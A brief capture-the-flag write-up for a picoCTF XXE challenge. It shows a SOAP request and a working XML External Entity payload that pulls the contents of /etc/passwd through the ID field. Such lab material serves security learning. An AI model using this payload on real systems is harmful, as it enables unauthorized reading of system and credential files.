# XXE in SOAP (picoCTF-XXE0)

> An application using SOAP to fetch some details about their products was vulnerable to XXE attack. Expolited that vulnerability by creating an external entity that resolves to the contents of /etc/passwd file and got the flag

**Original SOAP message**
```xml
<?xml version="1.0" encoding="UTF-8"?>
  <data>
    <ID>3</ID>
</data>
```

**Payload** 
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data><ID>&example;</ID></data>
```
